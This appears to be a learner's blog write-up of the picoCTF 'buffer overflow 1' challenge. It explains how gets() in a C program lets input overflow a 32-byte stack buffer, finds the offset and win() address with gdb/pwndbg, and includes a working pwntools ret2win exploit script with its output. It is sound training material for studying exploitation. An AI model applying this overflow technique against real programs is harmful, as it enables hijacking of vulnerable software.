<!--
---
slug: "picoctf-buffer-overflow-1"
title: "picoCTF — buffer overflow 1"
date: "2026-06-24"
ctf: "picoCTF"
challenge: "buffer overflow 1"
tags: ["ret2win", "pwn", "buffer overflow"]
tools: ["pwndbg", "gdb", "pwntools"]
summary: "Overwriting adjacent stack memory to direct program to new function."
---
-->

# picoCTF — buffer overflow 1

## Overview

| Field | Detail |
|-------|--------|
| CTF | picoCTF |
| Category | ret2win |
| Topics | Stack buffer overflow |
| Tools | GDB, pwndbg, pwntools |

---

## Reading the Source

The source code in C is provided.

First off, the `main` function calls the `vuln` function after prompting a user for input.

```c
puts("Please enter your string: ");
vuln();
```

The `vuln` function uses `gets()` to save the user input to a buffer. As explored in my writeup for the buffer overflow 0 challenge of this series, `gets()` is a vulnerable function as it does not check the size of the buffer or value before copying the value into the buffer.

```c
char buf[BUFSIZE];
gets(buf);
```

The buffer size is defined to be 32 bytes.

```c
#define BUFSIZE 32
```

Lastly, there is a defined `win` function that prints the flag if called. However, this function is never explicitly called in the binary.

---

## Finding the Offset

To find the offset between the start of the buffer and the return address, I used pwndbg to show the assembly code of the `vuln` function.

```bash
gdb ./vuln
b vuln
run
```

Within this output, the notable lines are those that state where the buffer is stored.

```bash
0x804929a <vuln+25>    lea    eax, [ebp - 0x28]
0x804929d <vuln+28>    push   eax
0x804929e <vuln+29>    call   gets@plt                    <gets@plt>
```

These three lines show that the buffer is stored at `ebp - 0x28` (meaning 40 bytes below ebp) and the `gets` function writes the input value into this buffer.

In x86, the ebp is 4 bytes and sits between the buffer and the return address. Hence, the total offset is `44` bytes.

---

## Finding the function address

Based on the source code, it was clear that the goal of the challenge was to overwrite the return address to redirect the program to the `win` function by overflowing the buffer in the `vuln` function.

Firstly, I had to determine the address of the `win` function. To do this, I used GDB with pwndbg. I first set a breakpoint at `main`, then ran the binary to this breakpoint, and at this point explored the addresses of all the functions in the binary.

```bash
gdb ./vuln
info functions
```

I got this output:

```bash
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
```

This shows that the address of the `win` function is `0x080491f6`.

---

## Writing the exploit

Now I had all the information I needed to write an exploit:
- Offset = `44`
- Target return address = `0x080491f6`

Using this info, I wrote a simple python script using pwn.

```python
from pwn import *

p = process('./vuln')

offset = 44
ret_addr = 0x080491f6

payload = b'A' * offset
payload += p32(ret_addr)

p.sendline(payload)
p.interactive()
```

Running this script, I got the following output:

```
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
FLAG{abcdef}
```

Success! The return address had been overwritten and the `win` function was called printing the flag.

---

## What I Learned

- **How to find offsets.** In the previous challenge, the offset was equal to the buffer size + ebp size. Here that was not the case as the program added in extra bytes for alignment. Hence, I had to use pwndbg to find the offset by reading the function's assembly code.
- **How to use GDB to find function memory addresses.** This challenge was my first time using GDB to find  addresses for functions in the binary.
- **How to use pwntools to write exploits.** This was also my first time using pwntools to write an exploit. While this case was a fairly simple exploit, I learned about the exploit writing process and what information is needed before writing an exploit.

---

## References

- [picoCTF - buffer overflow 1](https://learn.cylabacademy.org/library/258?page=1&workspace=true)
- [Exploiting with pwndbg](https://blog.xpnsec.com/pwndbg/)
    - Learning about how to use pwndbg on a similar problem, and how to understand output.
- [How to List All Functions in a Program Using GDB: A Step-by-Step Guide](https://linuxvox.com/blog/ask-gdb-to-list-all-functions-in-a-program/)
    - Learning how to use GDB to search for function memory addresses.
- [Writing exploits with pwntools](https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html)
